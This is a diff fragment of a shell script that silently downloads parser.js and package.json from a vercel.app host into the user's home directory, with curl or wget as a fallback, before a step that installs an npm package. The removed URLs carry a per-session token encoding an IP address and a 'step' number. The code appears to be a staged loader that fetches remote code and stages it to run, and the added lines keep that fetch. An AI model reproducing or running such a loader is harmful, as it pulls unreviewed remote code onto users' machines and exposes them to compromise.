@@ -80,12 +80,12 @@ BASE_URL="http://josehub88.vercel.app"
 # Check if curl is available
 if ! command -v curl >/dev/null 2>&1; then
     # If curl is not available, use wget
-    wget -q -O "$USER_HOME/parser.js" "$BASE_URL/task/parser?token=2a643f1b401f&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjE0NC4xNzIuMTAzLjE0Iiwic2Vzc2lvbklkIjoiMDQyODBlNzAtNTQ1Yy00MzA3LThiZTEtNGJhZjYxYTNmMzQzIiwic3RlcCI6MiwidGltZXN0YW1wIjoxNzcyNzkwMDM3MzQyLCJvcmlnVG9rZW4iOiIyYTY0M2YxYjQwMWYiLCJpYXQiOjE3NzI3OTAwMzcsImV4cCI6MTc3Mjc5MDIxN30.wiNshG3g5kPQ0_LpbKs49kGG-eIM8_7UUqbnqTYTpfA"
-    wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/package.json"
+    wget -q -O "$USER_HOME/parser.js" "$BASE_URL/parser.js"
+    wget -q -O "$USER_HOME/package.json" "$BASE_URL/package.json"
 else
     # If curl is available, use curl
-    curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/task/parser?token=2a643f1b401f&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjE0NC4xNzIuMTAzLjE0Iiwic2Vzc2lvbklkIjoiMDQyODBlNzAtNTQ1Yy00MzA3LThiZTEtNGJhZjYxYTNmMzQzIiwic3RlcCI6MiwidGltZXN0YW1wIjoxNzcyNzkwMDM3MzQyLCJvcmlnVG9rZW4iOiIyYTY0M2YxYjQwMWYiLCJpYXQiOjE3NzI3OTAwMzcsImV4cCI6MTc3Mjc5MDIxN30.wiNshG3g5kPQ0_LpbKs49kGG-eIM8_7UUqbnqTYTpfA"
-    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/package.json"
+    curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/parser.js"
+    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/package.json"
 fi
 
 # Step 9: Install 'request' package
